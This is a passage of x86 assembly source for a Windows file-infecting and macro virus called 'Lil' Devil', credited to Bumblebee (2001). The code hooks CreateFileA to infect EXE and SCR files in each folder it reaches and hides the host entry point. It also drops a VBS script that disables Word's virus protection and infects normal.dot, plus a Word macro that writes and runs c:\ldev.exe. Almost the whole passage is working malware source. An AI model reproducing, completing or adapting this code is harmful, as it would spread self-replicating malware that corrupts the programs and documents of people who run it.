                                                   ; fill padding with zeroes
           mov     edi,dword ptr [fileSize+ebp]    ; coz the data that fills
           mov     ecx,dword ptr [pad+ebp]         ; the file grow will be
           sub     ecx,edi                         ; random of win swap/mem
           add     edi,eax                         ; contents or something
           xor     eax,eax                         ; like...
           rep     stosb

           lea     esi,vBegin+5+ebp                ; update self CRC32
           mov     edi,vSize-5
           call    CRC32
           xor     dword ptr [hostEP+ebp],eax      ; hide host entry point

           mov     ecx,vSize                       ; copy the baby
           lea     esi,vBegin+ebp
           mov     edi,dword ptr [mapMem+ebp]
           add     edi,dword ptr [epAddr+ebp]
           rep     movsb

   infectionErrorCloseUnmap:
           push    dword ptr [mapMem+ebp]
           call    dword ptr [_UnmapViewOfFile+ebp]

   infectionErrorCloseMap:
           push    dword ptr [fhmap+ebp]
           call    dword ptr [_CloseHandle+ebp]

           lea     edi,fileTime2+ebp
           push    edi
           lea     edi,fileTime1+ebp
           push    edi
           lea     edi,fileTime0+ebp
           push    edi
           push    dword ptr [fHnd+ebp]
           call    dword ptr [_SetFileTime+ebp]

   infectionErrorClose:
           push    dword ptr [fHnd+ebp]
           call    dword ptr [_CloseHandle+ebp]

   infectionErrorAttrib:
           push    dword ptr [fileAttrib+ebp]
           push    dword ptr [fNameAddr+ebp]
           call    dword ptr [_SetFileAttributesA+ebp]

   infectionError:
           popad
           ret

   ;
   ; search stringz
   ;
   ; esi: string to search
   ; ecx: size of string
   ; eax: where to search
   ; edx: buffer size
   ;
   searchStringz:
           mov     edi,eax
           add     edx,edi
           sub     edx,ecx
   scanFileLoop:
           cmp     edi,edx
           ja      scanFileNotFound

           push    ecx
           push    esi
           push    edi

           rep     cmpsb
           pop     edi
           pop     esi
           pop     ecx
           je      scanFileFound
           inc     edi
           jmp     scanFileLoop

   scanFileNotFound:
           stc
           ret
   scanFileFound:
           clc
           ret

   ;
   ; Our CreateFileA hook.
   ;
   CreateFileAHook:
           pushad
           call    getDelta

           mov     eax,0000001h                    ; for reentrance fix
   multiThread     equ $-4
           or      eax,eax
           jz      busy

           dec     dword ptr [multiThread+ebp]     ; set to busy

           mov     esi,dword ptr [esp+24h]         ; get filename
           or      esi,esi                         ; check filename!=NULL
           jz      flee

           mov     edi,esi                         ; goto end of string
   getExt:
           cmp     byte ptr [edi],0
           je      checkExt
           inc     edi
           jmp     getExt
   checkExt:

   ;        @debug  "File found",esi                ; debug code

   folderLoop:
           cmp     byte ptr [edi],'\'
           je      endFolder
           cmp     edi,esi
           je      flee
           dec     edi
           jmp     folderLoop
   endFolder:
           inc     edi
           mov     ecx,edi
           sub     ecx,esi
           lea     edi,buffer1+ebp
           rep     movsb
           inc     edi
           mov     byte ptr [edi],0
           lea     esi,buffer1+ebp

   ;        @debug  "Folder found",esi              ; debug code

           ; ignore Set/Get directory errors, don't care
           ; sometimes change dir won't be necessary, but i ever
           ; try it

           push    esi
           push    MAXSTRING                       ; get current directory
           lea     esi,buffer0+ebp
           push    esi
           call    dword ptr [_GetCurrentDirectoryA+ebp]
           pop     esi

           push    esi                             ; goto found folder
           call    dword ptr [_SetCurrentDirectoryA+ebp]

           call    infectFolder                    ; uh uh

           lea     esi,buffer0+ebp                 ; go back home
           push    esi
           call    dword ptr [_SetCurrentDirectoryA+ebp]

   flee:
           inc     dword ptr [multiThread+ebp]     ; set to available
   busy:
           popad
           push    12345678h
   CFAhookRet      equ $-4
           ret

   ;
   ; Infects PE files in current directory. It affects EXE and SCR exts.
   ;
   infectFolder:
           pushad

           lea     esi,find_data+ebp               ; find first file
           push    esi
           lea     esi,fndMask+ebp
           push    esi
           call    dword ptr [_FindFirstFileA+ebp]
           inc     eax
           jz      notFound
           dec     eax

           mov     dword ptr [findHnd+ebp],eax

   findNext:
           lea     esi,find_data.cFileName+ebp
           mov     edi,esi
   foundFilenameLen:                               ; get string len
           cmp     byte ptr [edi],0
           je      filenameLenOk
           inc     edi
           jmp     foundFilenameLen
   filenameLenOk:
           push    edi                             ; test the string it's
           sub     edi,esi                         ; long enought
           cmp     edi,5
           pop     edi
           jna     skipThisFile

           mov     eax,dword ptr [edi-4]
           push    eax
           call    lowerDDSTACK
           pop     eax
           cmp     eax,'exe.'
           je      validFileExt
           cmp     eax,'rcs.'
           jne     skipThisFile

   validFileExt:
           mov     eax,dword ptr [find_data.nFileSizeLow+ebp]
           cmp     eax,8000h
           jb      skipThisFile                    ; at least 8000h bytes?
           mov     ecx,PADDING                     ; test if it's infected
           xor     edx,edx                         ; yet
           div     ecx
           or      edx,edx                         ; reminder is zero?
           jz      skipThisFile

           lea     esi,find_data.cFileName+ebp
           call    infect
   ;       @debug  "Infectable file",esi           ; debug code

   skipThisFile:
           lea     esi,find_data+ebp
           push    esi
           push    dword ptr [findHnd+ebp]
           call    dword ptr [_FindNextFileA+ebp]  ; Find next file
           or      eax,eax
           jnz     findNext

   infectionDone:
           push    dword ptr [findHnd+ebp]
           call    dword ptr [_FindClose+ebp]

   notFound:
           popad
           ret

   ;
   ; API hook routine.
   ;
   ; in:
   ;       eax     addr of loaded module
   ;       ecx     addr of API to hook
   ;       esi     addr of hook routine
   ; out:
   ;       eax     0 on error
   ;
   APIHook:
           push    esi
           mov     edx,eax
           mov     edi,edx
           add     edi,dword ptr [edx+3ch]         ; begin PE header
           mov     edi,dword ptr [edi+80h]         ; RVA import
           or      edi,edi                         ; uh? no imports??? :)
           jz      skipHookErr
           add     edi,edx                         ; add base addr
   searchK32Imp:
           mov     esi,dword ptr [edi+0ch]         ; get name
           or      esi,esi                         ; check is not last
           jz      skipHookErr
           add     esi,edx                         ; add base addr
           mov     ebx,dword ptr [esi]
           push    ebx
           call    lowerDDSTACK
           pop     ebx
           cmp     ebx,'nrek'                      ; look for Kernel32 module
           jne     nextName
           mov     ebx,dword ptr [esi+4]
           push    ebx
           call    lowerDDSTACK
           pop     ebx
           cmp     ebx,'23le'                      ; kernel32 found
           je      k32ImpFound
   nextName:                                       ; if not found check
           add     edi,14h                         ; name of next import
           mov     esi,dword ptr [edi]             ; module
           or      esi,esi
           jz      skipHookErr
           jmp     searchK32Imp
   k32ImpFound:                                    ; now we have k32
           mov     esi,dword ptr [edi+10h]         ; get address table
           or      esi,esi                         ; heh
           jz      skipHookErr
           add     esi,edx                         ; add base addr again

           mov     edi,ecx                         ; search for API
   nextImp:
           lodsd                                   ; get addrs
           or      eax,eax                         ; chek is not last
           jz      skipHookErr
           cmp     eax,edi                         ; cmp with API addr
           je      doHook                          ; found? hook!
           jmp     nextImp                         ; check next in table
   doHook:
           sub     esi,4
           push    esi                             ; save import addr

           call    dword ptr [_GetCurrentProcess+ebp]

           pop     esi edx
           mov     dword ptr [fileSize+ebp],edx    ; tmp storage

           lea     edi,fileAttrib+ebp
           push    edi                             ; tmp storage for shit
           push    4
           lea     edi,fileSize+ebp
           push    edi                             ; bytes to write
           push    esi                             ; where to write
           push    eax                             ; current process
           call    dword ptr [_WriteProcessMemory+ebp]
   skipHook:
           ret
   skipHookErr:
           pop     esi
           xor     eax,eax
           ret

   ;
   ; in:  esi from
   ;      edi to
   ; out: ebx added moved bytes
   ;
   ; My lstrcpy :) (it doesn't copy the zero)
   ; You can use lstrcat... but i like it counts the relative bytes moved...
   ;
   mlstrcpy:
           push    ecx
   mlstrcpyloop:
           cmp     byte ptr [esi],0
           je      mlstrcpyout
           movsb
           inc     ebx
           jmp     mlstrcpyloop
   mlstrcpyout:
           pop     ecx
           ret
   ;
   ; push  dword ptr [val]  ; 'eg.A'
   ; call  lowerDDSTACK
   ; pop   dword ptr [val]  ; 'eg.a'
   ;
   ; Changes val to lower case
   ;
   lowerDDSTACK:
           push    esi ecx
           mov     esi,esp
           add     esi,12
           mov     ecx,4
   lowerDDSTACKLoop:
           cmp     byte ptr [esi],'A'
           jb      nextByte
           cmp     byte ptr [esi],'Z'
           ja      nextByte
           or      byte ptr [esi],20h      ; this makes lower case only if
   nextByte:                               ; it is upper case ;)
           inc     esi
           loop    lowerDDSTACKLoop
           pop     ecx esi
           ret

   ; some messages
   copyright       db      0dh,0ah,'< Lil'' Devil Coded by Bumblebee >',0dh,0ah
   mess4Avers      db      'Come on little devil, be my little Angel...'

   ; Generated RLE compressed data
   drop    db 005h,04dh,05ah,06ch,000h,001h,083h,000h,004h,004h
       db 000h,011h,000h,082h,0ffh,001h,003h,082h,000h,001h
       db 001h,086h,000h,001h,040h,0a3h,000h,001h,070h,083h
       db 000h,02ch,00eh,01fh,0bah,00eh,000h,0b4h,009h,0cdh
       db 021h,0b8h,000h,04ch,0cdh,021h,054h,068h,069h,073h
       db 020h,070h,072h,06fh,067h,072h,061h,06dh,020h,072h
       db 065h,071h,075h,069h,072h,065h,073h,020h,057h,069h
       db 06eh,033h,032h,00dh,00ah,024h,084h,000h,002h,050h
       db 045h,082h,000h,008h,04ch,001h,002h,000h,0c4h,0beh
       db 0fbh,03ah,088h,000h,006h,0e0h,000h,002h,001h,00bh
       db 001h,08fh,000h,001h,010h,08ch,000h,001h,040h,082h
       db 000h,001h,010h,083h,000h,001h,002h,082h,000h,001h
       db 001h,087h,000h,001h,004h,088h,000h,001h,030h,083h
       db 000h,001h,002h,086h,000h,001h,002h,085h,000h,001h
       db 010h,082h,000h,001h,010h,084h,000h,001h,010h,082h
       db 000h,001h,010h,086h,000h,001h,010h,0ach,000h,001h
       db 020h,082h,000h,001h,00ch,0d3h,000h,005h,02eh,074h
       db 065h,078h,074h,084h,000h,001h,010h,083h,000h,001h
       db 010h,082h,000h,001h,001h,084h,000h,001h,002h,08eh
       db 000h,001h,020h,082h,000h,007h,060h,072h,065h,06ch
       db 06fh,063h,073h,083h,000h,001h,010h,083h,000h,001h
       db 020h,082h,000h,001h,00ch,084h,000h,001h,004h,08eh
       db 000h,001h,040h,082h,000h,001h,052h,0c8h,000h,001h
       db 0c3h,0ffh,000h,0ffh,000h,0ffh,000h,0ffh,000h,087h
       db 000h,001h,00ch,087h,000h

   ; data needed to get APIs
   FSTAPI                  label   byte
   CrcGetCurrentProcess    dd      003690e66h
                           db      18
   _GetCurrentProcess      dd      0

   CrcWriteProcessMemory   dd      00e9bbad5h
                           db      19
   _WriteProcessMemory     dd      0

   CrcCreateFileA          dd      08c892ddfh
                           db      12
   _CreateFileA            dd      0

   CrcMapViewOfFile        dd      0797b49ech
                           db      14
   _MapViewOfFile          dd      0

   CrcCreatFileMappingA    dd      096b2d96ch
                           db      19
   _CreateFileMappingA     dd      0

   CrcUnmapViewOfFile      dd      094524b42h
                           db      16
   _UnmapViewOfFile        dd      0

   CrcCloseHandle          dd      068624a9dh
                           db      12
   _CloseHandle            dd      0

   CrcGetFileTime          dd      04434e8feh
                           db      12
   _GetFileTime            dd      0

   CrcSetFileTime          dd      04b2a3e7dh
                           db      12
   _SetFileTime            dd      0

   CrcSetFileAttributesA   dd      03c19e536h
                           db      19
   _SetFileAttributesA     dd      0

   CrcGetFileAttributesA   dd      0c633d3deh
                           db      19
   _GetFileAttributesA     dd      0

   CrcGetFileSize          dd      0ef7d811bh
                           db      12
   _GetFileSize            dd      0

   CrcGetWindowsDirectoryA dd      0fe248274h
                           db      21
   _GetWindowsDirectoryA   dd      0

   CrcGetCurrentDirectoryA dd      0ebc6c18bh
                           db      21
   _GetCurrentDirectoryA   dd      0

   CrcSetCurrentDirectoryA dd      0b2dbd7dch
                           db      21
   _SetCurrentDirectoryA   dd      0

   CrcWriteFile            dd      021777793h
                           db      10
   _WriteFile              dd      0

   CrcFindFirstFileA       dd      0ae17ebefh
                           db      15
   _FindFirstFileA         dd      0

   CrcFindNextFileA        dd      0aa700106h
                           db      14
   _FindNextFileA          dd      0

   CrcFindClose            dd      0c200be21h
                           db      10
   _FindClose              dd      0

   Crclstrcat              dd      00792195bh
                           db      8
   _lstrcat                dd      0

   CrcLoadLibraryA         dd      04134d1adh
                           db      13
   _LoadLibraryA           dd      0

   CrcFreeLibrary          dd      0afdf191fh
                           db      12
   _FreeLibrary            dd      0

   CrcGetProcAddress       dd      0ffc97c1fh
                           db      15
   _GetProcAddress         dd      0

   ENDAPI                  label   byte

   ; vbs shit:
   ;
   ; Creates a word.application object and infects normal.dot with
   ; the file c:\ldev.sys. Also removes some nasty word options.
   ;
   vbsdrop:
   db      ''' ldev module',0dh,0ah
   db      'on error resume next',0dh,0ah
   db      'set w=createobject("word.application")',0dh,0ah
   db      'w.options.virusprotection=0',0dh,0ah
   db      'w.options.savenormalprompt=0',0dh,0ah
   db      'w.options.confirmconversions=0',0dh,0ah
   db      'w.normaltemplate.vbproject.vbcomponents.item(1).codemodule.'
   db      'addfromfile("c:\ldev.sys")',0dh,0ah
   db      'w.application.quit',0dh,0ah
   db      'wscript.quit',0dh,0ah
   vbsdroplen      equ $-vbsdrop

   ;
   ; Infects on open document with name != "Devil" (from normal.dot).
   ; Drops c:\ldev.exe and execs with name == "Devil" (from DOC).
   ;
   wordmacro:
   db      'private sub document_open()',0dh,0ah
   db      ''' ldev module',0dh,0ah
   db      'on error resume next',0dh,0ah
   db      'set ad=activedocument.vbproject.vbcomponents.item(1)',0dh,0ah
   db      'if ad.name <> "Devil" then',0dh,0ah
   db      'ad.name="Devil"',0dh,0ah
   db      'ad.codemodule.addfromfile("c:\ldev.sys")',0dh,0ah
   db      'else',0dh,0ah
   db      'drop',0dh,0ah
   db      'ldev=shell("c:\ldev.exe",vbnormalfocus)',0dh,0ah
   db      'setattr ("c:\ldev.exe"), 6',0dh,0ah
   db      'end if',0dh,0ah
   db      'end sub',0dh,0ah
   db      'private sub drop()',0dh,0ah
   db      'open "c:\ldev.exe" for binary as #1',0dh,0ah
   wordmacrolen    equ $-wordmacro
   closedu db      'close #1',0dh,0ah,'end sub',0dh,0ah
   closedus        equ $-closedu

   presub  db      'private sub a()',0dh,0ah,0
   endsub  db      'end sub',0dh,0ah,0
   letlin  db      'bee$=',0
   chrlin  db      'chr$(',0
   putlin  db      'put #1,,bee$',0dh,0ah,0

   infWord         db      1                       ; 1st gen infects word
   ; some stringz used
   seflextractor   db      'tractor'
   seflextractors  equ     $-seflextractor
   antivirus       db      'ntivir'
   antiviruss      equ     $-antivirus
   tmpfilename     db      '\ldevrtl.dll',0
   vbsfilename     db      '\ldevwm.vbs',0
   macrofilename   db      'c:\ldev.sys',0
   fndMask         db      '*.*',0

   shell32dll      db      'shell32.dll',0
   shellexec       db      'ShellExecuteA',0

   vEnd    label   byte
   ; virtual data follows (not stored inside the file)

   ; biggah buffer to store the generated wm macro. I know i can alloc
   ; mem but.. why not? Seems to work. Moreover i'm lazy to use
   ; mapped files again or to use other more standard alloc API. ;)
   ; So i did it dirty and nasty hehehe i know you like it this way :D
   buffer0         db      20000h dup (0)          ; huahahaha

   buffer1         db      MAXSTRING dup (0)
   address         dd      0
   names           dd      0
   ordinals        dd      0
   nexports        dd      0
   expcount        dd      0
   mHnd            dd      0
   fHnd2           dd      0
   find_data       WIN32_FIND_DATA <0>
   findHnd         dd      0
   fHnd            dd      0
   mapMem          dd      0
   fhmap           dd      0
   fileSize        dd      0
   epAddr          dd      0
   fileAttrib      dd      0
   fileTime0       dd      0,0
   fileTime1       dd      0,0
   fileTime2       dd      0,0
   pad             dd      0
   fNameAddr       dd      0
   vVEnd   label   byte

   fakeHost:
           push    1000h
           call    mbtitle
           db      '(C) 2001 Bumblebee',0
   mbtitle:
           call    mbmess
           db      'Lil'' Devil activated. Have a nice day.',0
   mbmess:
           push    0h
           call    MessageBoxA

           push    0h
           call    ExitProcess

   Ends
   End     inicio
